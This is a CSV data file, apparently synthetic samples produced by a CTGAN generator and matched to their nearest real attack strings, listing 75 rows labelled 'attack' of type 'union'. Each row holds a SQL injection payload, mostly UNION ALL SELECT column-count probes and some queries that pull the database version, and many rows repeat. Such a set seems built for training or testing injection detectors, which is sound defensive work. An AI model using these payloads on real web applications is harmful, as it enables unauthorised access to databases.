id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000042,7.418425231500906
CTGAN_000002,attack,union,"-9110""   )    )    union all select 2263,2263,2263,2263,2263#",nearest_attack_euclidean,R000059,5.317761706833174
CTGAN_000003,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,5.948187400137796
CTGAN_000004,attack,union," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",nearest_attack_euclidean,R000005,8.550969792428711
CTGAN_000005,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.476126062989774
CTGAN_000006,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000025,6.005550363423218
CTGAN_000007,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,7.375729211180487
CTGAN_000008,attack,union,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000034,5.832789941375512
CTGAN_000009,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,5.557931075556335
CTGAN_000010,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000038,5.487088760806507
CTGAN_000011,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000073,5.631692174226055
CTGAN_000012,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,7.277511866204679
CTGAN_000013,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,6.320884516561363
CTGAN_000014,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,7.070390106728699
CTGAN_000015,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.606021433292914
CTGAN_000016,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,4.377563103016791
CTGAN_000017,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,6.503607593850618
CTGAN_000018,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,9.556485042676174
CTGAN_000019,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.208260538422716
CTGAN_000020,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,7.15032313274314
CTGAN_000021,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000003,11.098173560002454
CTGAN_000022,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.506506840452545
CTGAN_000023,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,5.1243147910916145
CTGAN_000024,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,8.668000336884399
CTGAN_000025,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000068,5.079507480852833
CTGAN_000026,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000031,6.776505207515592
CTGAN_000027,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,9.144664724979336
CTGAN_000028,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000011,8.008992319739823
CTGAN_000029,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,6.698403839535085
CTGAN_000030,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.286536531861841
CTGAN_000031,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,6.7784472239959035
CTGAN_000032,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000064,4.022103514869546
CTGAN_000033,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,6.837236600270096
CTGAN_000034,attack,union,"-8812""  )   where 1646  =  1646 union all select 1646,1646,1646,1646,1646,1646--",nearest_attack_euclidean,R000043,6.225962014081061
CTGAN_000035,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,7.0625430257707125
CTGAN_000036,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,5.469074637247267
CTGAN_000037,attack,union," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,10.584873123477967
CTGAN_000038,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,7.8319497252393555
CTGAN_000039,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,6.483802849415437
CTGAN_000040,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,7.673094042122415
CTGAN_000041,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,5.385919532748746
CTGAN_000042,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,7.879586409352065
CTGAN_000043,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,5.522788266475468
CTGAN_000044,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,8.02810316974958
CTGAN_000045,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.094980392246861
CTGAN_000046,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000062,6.843072846028022
CTGAN_000047,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000054,6.298346068048031
CTGAN_000048,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,6.962651591712343
CTGAN_000049,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000023,6.31665045996346
CTGAN_000050,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,6.045343663172711
CTGAN_000051,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000018,6.126746144485552
CTGAN_000052,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,5.215310380326717
CTGAN_000053,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000069,6.382206079895799
CTGAN_000054,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.88335240901232
CTGAN_000055,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,6.776206249266648
CTGAN_000056,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,6.857098462838576
CTGAN_000057,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000019,6.477378969593195
CTGAN_000058,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000053,4.914457799580091
CTGAN_000059,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,6.847693885282645
CTGAN_000060,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,6.868126343253677
CTGAN_000061,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000027,7.232011571647689
CTGAN_000062,attack,union,"-8521'  )   union all select 2446,2446,2446,2446,2446,2446,2446#",nearest_attack_euclidean,R000067,7.17887370472189
CTGAN_000063,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000066,4.80006234483208
CTGAN_000064,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,5.609961155890371
CTGAN_000065,attack,union,"-1401""   )    )    union all select 3480,3480,3480,3480,3480,3480--",nearest_attack_euclidean,R000072,5.221750764582089
CTGAN_000066,attack,union,"-9156'   )    )    union all select 9110,9110,9110,9110#",nearest_attack_euclidean,R000026,4.218464493639126
CTGAN_000067,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,7.4026398488836636
CTGAN_000068,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000061,7.647155648779684
CTGAN_000069,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,4.743359542405785
CTGAN_000070,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000033,6.761255487823368
CTGAN_000071,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000049,5.2868306094109005
CTGAN_000072,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000065,6.823132486274252
CTGAN_000073,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000016,4.872477676134097
CTGAN_000074,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000013,8.984886926444217
CTGAN_000075,attack,union,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",nearest_attack_euclidean,R000028,5.230202551988128
